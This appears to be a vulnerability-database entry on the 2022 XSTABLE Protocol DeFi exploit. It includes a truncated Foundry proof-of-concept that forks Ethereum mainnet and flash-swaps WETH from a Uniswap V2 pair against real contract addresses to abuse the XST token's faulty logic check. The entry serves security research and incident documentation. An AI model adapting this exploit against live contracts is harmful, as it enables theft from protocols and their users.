# [?] XSTABLE Protocol - Incorrect Logic Check

## Summary
Severity: Unknown
Chain: Ethereum
Component: XST
Published: 2022-08-10
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/XST_exp.sol
Type: defi-exploit-poc

## Details
References:
- https://tools.blocksec.com/tx/eth/0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./../interface.sol";

// Pool1: UniswapV2 WETH/USDT
// Pool2: UniswapV2 WETH/XST
// https://tools.blocksec.com/tx/eth/0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3

contract XSTExpTest is Test {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant UniswapV20x694f = 0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C;
    address constant XST = 0x91383A15C391c142b80045D8b4730C1c37ac0378;
    address constant XStable2 = 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799;
    address constant UniswapV20x0d4a = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheat.createSelectFork("mainnet", 15_310_016);
    }

    function testExploit() public {
        uint256 balance = IERC20(WETH).balanceOf(UniswapV20x694f);
        IUniswapV2Pair(UniswapV20x0d4a).swap(balance * 2, 0, address(this), "0000");
        uint256 WETHBalance = IERC20(WETH).balanceOf(address(this));
        console.log("now my weth num: %s", WETHBalance / 1e18);
        IERC20(WETH).withdraw(WETHBalance);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if (keccak256(data) == keccak256("0000")) {
            uint256 balance = IERC20(WETH).balanceOf(address(this));
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/XST_exp.sol_
